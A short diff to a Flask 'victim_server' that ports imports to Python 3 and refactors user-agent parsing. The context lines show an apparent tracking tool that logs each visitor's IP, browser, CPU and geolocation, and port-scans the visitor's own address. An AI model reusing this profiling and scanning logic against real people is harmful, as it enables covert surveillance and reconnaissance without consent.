@@ -12,7 +12,6 @@
 # Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
 #**
 import time
-from core.dependence import urllib2
 from flask import Flask, render_template, session, request, json, Response
 from core.user_objects import *
 import core.stats
@@ -22,6 +21,7 @@ import os
 import sys
 import platform
 import urllib
+import urllib.request
 import requests
 from multiprocessing import Process
 """
@@ -75,7 +75,8 @@ class victim_server(object):
         if vId == '':
           vId = utils.generateToken(5)
         
-        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
+        ua_platform, ua_browser, ua_version = utils.parseUserAgent(request.user_agent)
+        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], ua_platform, ua_browser, ua_version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
         victimGeo = victim_geo(vId, request.form['city'], request.form['country_code2'], request.form['country_name'], request.form['ip'], request.form['latitude'], request.form['longitude'], request.form['isp'], request.form['country_code3'], request.form['state_prov'], '', request.form['zipcode'], request.form['organization'], str(request.user_agent), '')
         
         vRA = request.environ['REMOTE_ADDR']
